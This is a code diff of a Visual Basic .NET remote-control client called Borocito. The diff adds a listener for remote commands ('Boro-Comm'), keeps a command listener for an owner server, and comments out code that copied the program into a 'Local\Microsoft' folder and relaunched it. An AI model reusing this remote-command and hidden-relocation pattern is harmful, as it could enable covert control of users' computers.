@@ -8,7 +8,7 @@ Module GlobalUses
     Public HttpOwnerServer As String
     Public compileVersion As String = My.Application.Info.Version.ToString &
         " (" & Application.ProductVersion & ") " &
-        "[22/04/2023 13:13]" 'Indicacion exacta de la ultima compilacion
+        "[05/03/2025 23:56]" 'Indicacion exacta de la ultima compilacion
 End Module '<--- ACTUALIZAR DATOS
 Module Utility
     Public tlmContent As String
@@ -122,6 +122,8 @@ Module StartUp
                 'iniciar todo lo demas.
                 '   Escuchar comandos desde el servidor
                 Network.CommandManager.CommandListenerManager(True)
+                '   Escuchar comandos a traves de Boro-Comm
+                Boro_Comm.StartServer()
                 '   Escuchar configuracion de UID
                 Network.ServerHandle.ConfigFileListenerManager(True)
             Else
@@ -148,7 +150,7 @@ Module StartUp
             Else
                 AddToLog("StopIt", "Ending execution...", True)
             End If
-            Boro_Comm.Connector.ENVIARTODOS("boro_conn|DISCONNECTED_BY_OWN")
+            Boro_Comm.Connector.SendMesssage("|DISCONNECTED_BY_OWN|")
             End
         Catch ex As Exception
             AddToLog("Stopit@StartUp", "Error: " & ex.Message, True)
@@ -172,12 +174,12 @@ Module StartUp
         Try
             If Application.StartupPath.Contains("Local\Microsoft") = False Then
                 AddToLog("RunFromLocation@StartUp", "Running from " & Application.ExecutablePath, True)
-                If My.Computer.FileSystem.FileExists(DIRCommons & "\Borocito.exe") Then
-                    My.Computer.FileSystem.DeleteFile(DIRCommons & "\Borocito.exe")
-                End If
-                My.Computer.FileSystem.CopyFile(Application.ExecutablePath, DIRCommons & "\Borocito.exe")
-                Process.Start(DIRCommons & "\Borocito.exe", parameters)
-                Stopit()
+                'If My.Computer.FileSystem.FileExists(DIRCommons & "\Borocito.exe") Then
+                '    My.Computer.FileSystem.DeleteFile(DIRCommons & "\Borocito.exe")
+                'End If
+                'My.Computer.FileSystem.CopyFile(Application.ExecutablePath, DIRCommons & "\Borocito.exe")
+                'Process.Start(DIRCommons & "\Borocito.exe", parameters)
+                'Stopit()
             End If
         Catch ex As Exception
             AddToLog("RunFromLocation@StartUp", "Error: " & ex.Message, True)
